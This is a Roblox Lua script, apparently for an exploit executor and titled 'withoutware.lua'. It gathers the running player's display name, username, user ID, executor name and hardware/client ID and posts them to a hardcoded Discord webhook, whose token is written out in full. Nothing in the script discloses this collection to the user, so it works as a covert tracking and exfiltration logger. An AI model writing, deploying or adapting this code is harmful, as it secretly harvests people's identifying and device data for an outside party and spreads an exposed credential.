function SendMessage(url, message)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = message
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

function SendMessageEMBED(url, embed)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["description"] = embed.description,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = embed.footer.text
                }
            }
        }
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local url = "https://discord.com/api/webhooks/1304291246914670643/F-Q6Mr_pVwxUIX4Sw4pcX5w3p6Nq6vVqRTxtjCYS54wZDVJ2P1VjfxX1vL4-NL1f2C5R"
SendMessage(url)

local embed = {
	["title"] = "withoutware.lua",
	["description"] = "",
	["color"] = 0,
	["fields"] = {
		{
			["name"] = "User Display",
			["value"] = game.Players.LocalPlayer.DisplayName
		},
		{
			["name"] = "User Nickname",
			["value"] = game.Players.LocalPlayer.Name
		},
		{
			["name"] = "User ID",
			["value"] = game.Players.LocalPlayer.UserId
		},
		{
			["name"] = "User Exploit",
			["value"] = identifyexecutor()
		},
        {
            ["name"] = "User Hardware ID",
            ["value"] = game:GetService("RbxAnalyticsService"):GetClientId()
        }
	},
	["footer"] = {
		["text"] = "",
	},
}
SendMessageEMBED(url, embed)
